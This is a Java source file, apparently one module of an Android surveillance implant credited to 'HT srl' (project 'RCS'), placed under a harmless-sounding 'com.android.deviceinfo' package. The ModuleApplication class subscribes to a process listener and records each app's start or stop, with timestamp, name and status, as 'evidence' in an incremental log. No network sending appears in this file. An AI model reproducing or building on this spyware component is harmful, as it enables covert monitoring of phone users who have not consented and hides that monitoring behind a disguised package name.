/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentApplication.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.module;

import java.util.ArrayList;

import android.app.ActivityManager.RunningAppProcessInfo;

import com.android.deviceinfo.ProcessInfo;
import com.android.deviceinfo.ProcessStatus;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.conf.ConfModule;
import com.android.deviceinfo.evidence.EvidenceReference;
import com.android.deviceinfo.evidence.EvidenceType;
import com.android.deviceinfo.interfaces.IncrementalLog;
import com.android.deviceinfo.interfaces.Observer;
import com.android.deviceinfo.listener.ListenerProcess;
import com.android.deviceinfo.util.ByteArray;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.DateTime;
import com.android.deviceinfo.util.WChar;


public class ModuleApplication extends BaseModule implements IncrementalLog, Observer<ProcessInfo> {
	private static final String TAG = "ModuleApplication"; //$NON-NLS-1$

	@Override
	public boolean parse(ConfModule conf) {
		return true;
	}

	@Override
	public void actualGo() {

	}

	EvidenceReference logIncremental;

	@Override
	public void actualStart() {
		// viene creato un file temporaneo di log application, aperto.
		logIncremental = new EvidenceReference(EvidenceType.APPLICATION);
		ListenerProcess.self().attach(this);
	}

	@Override
	public void actualStop() {
		ListenerProcess.self().detach(this);
		// il log viene chiuso.
		logIncremental.close();
	}

	public int notification(ProcessInfo process) {
		saveEvidence(process.processInfo, process.status);
		return 0;
	}

	/**
	 * Viene invocata dalla notification, a sua volta invocata dal listener
	 * 
	 * @param process
	 * @param status
	 */
	private void saveEvidence(RunningAppProcessInfo process, ProcessStatus status) {
		if (Cfg.DEBUG) {
			Check.requires(process != null, "null process"); //$NON-NLS-1$
		}

		final String name = process.processName;
		final String module = process.processName;

		final byte[] tm = (new DateTime()).getStructTm();

		final ArrayList<byte[]> items = new ArrayList<byte[]>();
		items.add(tm);
		items.add(WChar.getBytes(name, true));
		items.add(WChar.getBytes(status.name(), true));
		items.add(WChar.getBytes(module, true));
		items.add(ByteArray.intToByteArray(EvidenceReference.E_DELIMITER));

		if (Cfg.DEBUG) {
			Check.asserts(logIncremental != null, "null log"); //$NON-NLS-1$
		}

		synchronized (this) {
			logIncremental.write(items);
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (saveEvidence): " + name + " " + status.name());//$NON-NLS-1$ //$NON-NLS-2$
		}
	}

	public synchronized void resetLog() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (resetLog)");
		}
		if (logIncremental.hasData()) {
			logIncremental.close();
			logIncremental = new EvidenceReference(EvidenceType.APPLICATION);
		}
	}

}
